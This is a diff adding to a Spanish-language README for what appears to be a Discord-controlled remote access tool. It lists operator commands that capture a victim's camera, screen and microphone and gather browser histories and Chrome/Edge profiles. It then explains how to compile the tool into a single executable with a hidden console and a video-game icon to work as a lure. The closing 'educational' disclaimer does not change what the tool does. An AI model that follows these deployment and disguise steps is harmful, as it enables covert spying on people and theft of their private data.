@@ -51,14 +51,35 @@ Debes editar las siguientes variables en el código fuente con tus propios datos
 # --- CONFIGURACIÓN ---
 BOT_TOKEN = "TU_TOKEN_AQUÍ"
 CHANNEL_ID = 0000000000000000  # Tu ID de canal de Discord
+```
 
+## 🎮 Comandos del Operador
 
+| Comando | Función |
+| :--- | :--- |
+| `!panel` | Despliega botones interactivos para Cámara, Pantalla y Micrófono. |
+| `!avanzado` | Herramientas para generar reportes Word (.docx) y ZIP con historiales de navegación. |
+| `!perfiles` | Lista todos los perfiles de Chrome/Edge detectados en el sistema de la víctima. |
 
+## 🛠️ Compilación a Ejecutable (.exe)
 
+Para convertir este script en un binario funcional y listo para distribución, se recomienda utilizar la herramienta **Auto-py-to-exe**. Sigue estos pasos para una configuración óptima:
 
+1.  **Script Location:** Selecciona tu archivo principal `.py`.
+2.  **One File:** Selecciona esta opción para empaquetar todo en un único archivo ejecutable.
+3.  **Window Based:** Selecciona la opción **Hide Console** para asegurar que el proceso sea silencioso y no abra terminales sospechosas.
+4.  **Icon:** Añade un archivo `.ico` relacionado con videojuegos (ej. un icono de DOOM o un mando de consola) para maximizar la efectividad del señuelo.
+5.  **Convert:** Haz clic en el botón de conversión y busca el ejecutable final en la carpeta `output`.
 
+---
 
+## ⚠️ Descargo de Responsabilidad (Disclaimer)
 
+Este proyecto ha sido desarrollado con fines **estrictamente educativos y de investigación en ciberseguridad**. El uso de este código para comprometer sistemas, acceder a datos privados o realizar cualquier actividad maliciosa sin autorización previa es **ilegal** y está penado por las leyes internacionales de delitos informáticos. 
 
+El autor no se hace responsable del mal uso, daños o consecuencias legales derivadas de la implementación de esta herramienta fuera de un entorno de laboratorio controlado.
 
+---
 
+**Desarrollado por:** [Ricardo & Heidi]  
+**Categoría:** Cybersecurity Research / Red Teaming Tools
